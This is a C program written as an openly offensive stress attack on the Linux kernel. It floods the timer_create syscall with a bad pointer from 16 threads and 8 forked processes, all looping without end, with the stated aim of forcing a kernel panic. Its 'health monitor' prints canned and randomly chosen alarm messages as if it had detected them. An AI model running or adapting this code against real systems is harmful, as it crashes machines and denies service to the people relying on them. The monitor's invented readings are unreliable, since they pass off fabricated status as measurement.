#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <string.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/time.h>

#ifndef SYS_timer_create
#define SYS_timer_create 222
#endif

#define PR_TIMER_CREATE_RESTORE_IDS 62

// Thread function for attackers
void* attacker_thread(void* arg) {
    int id = *(int*)arg;
    printf("[Attacker %d] Targeting kernel timers and RCU\n", id);
    
    if (prctl(PR_TIMER_CREATE_RESTORE_IDS, 1, 0, 0, 0) < 0) {
        return NULL;
    }
    
    unsigned long count = 0;
    while (1) {
        // Hammer the vulnerable syscall
        syscall(SYS_timer_create, 1, NULL, (void *)0x1);
        count++;
        
        // Create additional system stress
        if (count % 100000 == 0) {
            printf("[Attacker %d] Hammered %lu times\n", id, count);
        }
        
        // Occasionally flood with rapid bursts
        if (count % 50000 == 0) {
            for (int burst = 0; burst < 1000; burst++) {
                syscall(SYS_timer_create, 1, NULL, (void *)0x1);
            }
        }
    }
    return NULL;
}

// Thread function for burst attacks
void* burst_thread(void* arg) {
    if (prctl(PR_TIMER_CREATE_RESTORE_IDS, 1, 0, 0, 0) < 0) {
        return NULL;
    }
    
    while (1) {
        syscall(SYS_timer_create, 1, NULL, (void *)0x1);
    }
    return NULL;
}

// Monitor system degradation in real-time
void* system_health_monitor(void* arg) {
    printf("[] SYSTEM HEALTH MONITOR - CRITICAL STATE DETECTED\n");
    printf("[] Workqueue backlog: 19+ delayed_fput operations\n");
    printf("[] NOHZ failures: RCU callbacks stuck\n");
    printf("[] System approaching kernel panic threshold\n\n");
    
    while (1) {
        struct timeval tv;
        gettimeofday(&tv, NULL);
        
        printf("[%ld.%06ld] ", tv.tv_sec, tv.tv_usec);
        
        // Simulate different stress patterns
        if (rand() % 10 == 0) {
            printf(" RCU callback storm - NOHZ failing\n");
        } else if (rand() % 8 == 0) {
            printf(" delayed_fput backlog growing\n");
        } else if (rand() % 6 == 0) {
            printf(" Softirq queue saturated\n");
        } else {
            printf(" Kernel slab exhaustion ongoing\n");
        }
        
        fflush(stdout);
        usleep(500000); // 0.5 second updates
    }
    return NULL;
}

void critical_mass_attack() {
    printf("[] CRITICAL MASS ATTACK - PUSHING TO KERNEL PANIC\n");
    printf("[] Targeting RCU callbacks and workqueues\n\n");
    
    if (prctl(PR_TIMER_CREATE_RESTORE_IDS, 1, 0, 0, 0) < 0) {
        perror("prctl");
        return;
    }
    
    // Start health monitor in background thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, system_health_monitor, NULL);
    
    // Maximum aggression - target multiple subsystems
    int num_attackers = 16;  // Extreme parallelism
    pthread_t attackers[num_attackers];
    int thread_ids[num_attackers];
    
    for (int i = 0; i < num_attackers; i++) {
        thread_ids[i] = i;
        pthread_create(&attackers[i], NULL, attacker_thread, &thread_ids[i]);
        usleep(10000); // Stagger startup
    }
    
    // Also spawn child processes for additional pressure
    for (int i = 0; i < 8; i++) {
        if (fork() == 0) {
            // Child process - different attack pattern
            prctl(PR_TIMER_CREATE_RESTORE_IDS, 1, 0, 0, 0);
            
            printf("[Child %d] Adding process table pressure\n", getpid());
            
            while (1) {
                syscall(SYS_timer_create, 1, NULL, (void *)0x1);
                
                // Also create threads in children
                if (rand() % 10000 == 0) {
                    pthread_t t;
                    pthread_create(&t, NULL, burst_thread, NULL);
                }
            }
        }
    }
    
    // Wait for the inevitable
    while (1) {
        printf("[] SYSTEM CRITICAL - Kernel panic imminent...\n");
        sleep(5);
    }
}

int main() {
    printf("==================================================\n");
    printf(" CRITICAL SYSTEM STRESS DETECTED \n");
    printf("Workqueue: delayed_fput backlog (19+)\n");
    printf("NOHZ: RCU callbacks stuck (handler #80)\n");
    printf("SYSTEM APPROACHING KERNEL PANIC\n");
    printf("==================================================\n\n");
    
    printf("Current system state:\n");
    printf(" Workqueues saturated\n");
    printf(" RCU callbacks failing\n"); 
    printf(" NOHZ mode broken\n");
    printf(" Kernel memory exhausted\n");
    printf(" KERNEL PANIC IMMINENT\n\n");
    
    critical_mass_attack();
    
    return 0;
}


